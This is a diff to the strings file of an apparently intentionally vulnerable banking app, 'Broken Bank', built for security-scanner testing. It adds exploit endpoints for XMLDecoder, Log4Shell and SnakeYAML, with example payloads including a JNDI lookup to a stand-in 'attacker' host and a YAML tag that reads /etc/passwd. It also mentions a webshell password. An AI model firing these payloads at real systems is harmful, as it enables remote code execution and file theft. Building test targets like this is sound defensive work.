@@ -210,8 +210,8 @@ disclaimer:
         - "Private Keys - CKV_SECRET_13"
         - "Plus 70+ additional API keys and tokens"
     license:
-      title: "License Compliance Testing (71 packages)"
-      intro: "Includes 71 PyGremlinBox packages at v1.4.6 (65 varied license packages + 6 malware simulation packages) for comprehensive SCA and security testing:"
+      title: "License Compliance Testing (65 packages)"
+      intro: "Includes 65 PyGremlinBox packages at v1.4.6 (varied license packages) for comprehensive SCA license policy testing:"
       entries:
         - "Copyleft Licenses: AGPL (1.0/3.0 with version restrictions), GPL (2.0/3.0), LGPL (2.0/2.1/3.0)"
         - "Permissive Licenses: MPL (1.1/2.0), EPL (1.0/2.0), EUPL (1.1/1.2/3.0)"
@@ -219,8 +219,7 @@ disclaimer:
         - "Hardware Licenses: CERN OHL (S/W 2.0), TAPR OHL (1.0)"
         - "Business Licenses: SSPL (1.0), MS-LPL, BUSL (1.1), PolyForm (Noncommercial/Small Business)"
         - "Special Licenses: Copyleft Next (0.3.0/0.3.1), Hippocratic (2.1), Unlicense, and 40+ additional license types"
-        - "Malware Simulation: Network indicators, C2 beacon, code obfuscation, install execution, credential harvesting, cryptomining indicators"
-      footer: "These packages enable comprehensive testing of SCA tools' ability to detect, categorise, and enforce license policies and identify malware signatures across diverse package types."
+      footer: "These packages enable comprehensive testing of SCA tools' ability to detect, categorise, and enforce license policies across diverse package types."
     iac:
       title: "IaC Security Testing (30+ misconfigurations)"
       intro: "Dockerfile.BrokenBank contains intentional IaC misconfigurations for security scanner validation:"
@@ -533,7 +532,35 @@ tomcat_servlets:
     step2_title: "Step 2: Execute Commands via Webshell"
     note_label: "Note:"
     note_text: "Replace YOUR_IP with actual server IP address. The webshell password is 'j'."
-  
+
+  restore:
+    page_title: "GoCortex Broken Bank - Configuration Profile Restore"
+    description: "Import a previously exported branch/ATM device configuration profile"
+    input_placeholder: "Paste exported configuration XML"
+    submit_button: "Restore Configuration"
+    result_header: "Configuration Restored:"
+    error_message: "Error restoring configuration:"
+
+  log4shell:
+    page_title: "GoCortex Broken Bank - Client API Version Log (Log4Shell)"
+    input_placeholder: "Client API version, or ${jndi:ldap://host/a}"
+    submit_button: "Check Version"
+    example_text: "Example:"
+    example_payload: "${java:version}, ${env:HOSTNAME}, ${jndi:ldap://attacker/a}"
+    result_header: "Resolved Version String:"
+    error_message: "Error processing version string:"
+
+  snakeyaml:
+    page_title: "GoCortex Broken Bank - YAML Configuration Restore (SnakeYAML)"
+    input_placeholder: "Paste an exported YAML configuration backup"
+    submit_button: "Restore Configuration"
+    example_text: "Example:"
+    example_payload: "!!java.io.File [/etc/passwd]"
+    result_header: "Configuration Restored:"
+    type_label: "Instantiated type:"
+    value_label: "Value:"
+    error_message: "Error restoring configuration:"
+
   dashboard:
     page_title: "GoCortex Broken Bank - Exploit Endpoints"
     version_info: "Version {version}"
@@ -587,7 +614,31 @@ tomcat_servlets:
     spring4shell_type_value: "Remote Code Execution (RCE)"
     spring4shell_cve: "CVE:"
     spring4shell_cve_value: "CVE-2022-22965 (CVSS 9.8 Critical)"
-    
+
+    restore_endpoint_title: "/restore - Configuration Profile Restore (XMLDecoder)"
+    restore_vulnerability: "Vulnerability:"
+    restore_vulnerability_desc: "Arbitrary object instantiation/invocation via java.beans.XMLDecoder"
+    restore_type: "Type:"
+    restore_type_value: "Remote Code Execution (RCE)"
+    restore_test: "Test:"
+    restore_test_desc: "Submit an XMLDecoder payload driving ProcessBuilder"
+
+    log4shell_endpoint_title: "/log4shell - Log4Shell (CVE-2021-44228)"
+    log4shell_vulnerability: "Vulnerability:"
+    log4shell_vulnerability_desc: "JNDI lookup via user-controlled string logged by Log4j 2.14.1"
+    log4shell_type: "Type:"
+    log4shell_type_value: "Remote Code Execution (RCE)"
+    log4shell_cve: "CVE:"
+    log4shell_cve_value: "CVE-2021-44228 (CVSS 10.0 Critical)"
+
+    snakeyaml_endpoint_title: "/snakeyaml - YAML Deserialisation (CVE-2022-1471)"
+    snakeyaml_vulnerability: "Vulnerability:"
+    snakeyaml_vulnerability_desc: "Arbitrary type instantiation via SnakeYAML 1.33 default Constructor"
+    snakeyaml_type: "Type:"
+    snakeyaml_type_value: "Remote Code Execution (RCE)"
+    snakeyaml_cve: "CVE:"
+    snakeyaml_cve_value: "CVE-2022-1471 (CVSS 9.8 Critical)"
+
     tomcat_version_label: "Tomcat Version:"
     tomcat_cves: "8.5.0 (CVE-2020-1938 Ghostcat, CVE-2020-9484 RCE)"
     spring_framework_label: "Spring Framework:"
@@ -601,7 +652,7 @@ spaceatm:
   terminal:
     title: "SpaceATM Terminal"
     subtitle: "Mars Banking Initiative"
-    boot_message: "SpaceATM Terminal v1.4.0 - Initialising..."
+    boot_message: "SpaceATM Terminal v1.6.0 - Initialising..."
     ready_message: "Terminal Ready"
     manufacturer: "GoCortex IO Pty Ltd"
     manufacturer_location: "Southbank VIC 3006"
@@ -610,7 +661,7 @@ spaceatm:
     serial_number: "VIC-SA-003847"
     model: "SA-7000 Series"
     firmware: "FW-2025.03.1"
-    version_label: "Broken Bank v1.4.0"
+    version_label: "Broken Bank v1.6.0"
     cve_surface: "CVE-2025-55182"
   
   currency:
